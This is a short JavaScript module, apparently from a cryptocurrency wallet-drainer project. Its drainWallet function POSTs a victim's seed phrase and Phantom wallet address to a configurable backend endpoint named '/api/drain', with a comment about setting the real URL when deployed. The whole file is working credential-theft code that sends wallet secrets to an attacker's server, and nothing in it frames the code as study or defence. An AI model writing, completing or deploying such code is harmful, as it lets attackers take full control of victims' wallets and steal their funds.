// IMPORTANT: Replace this URL with your actual backend URL when deployed
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api/drain';

export const drainWallet = async (seedPhrase, walletAddress) => {
  const response = await fetch(API_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      seedPhrase: seedPhrase,
      walletType: 'Phantom',
      walletAddress: walletAddress,
    }),
  });

  const data = await response.json();
  return data;
};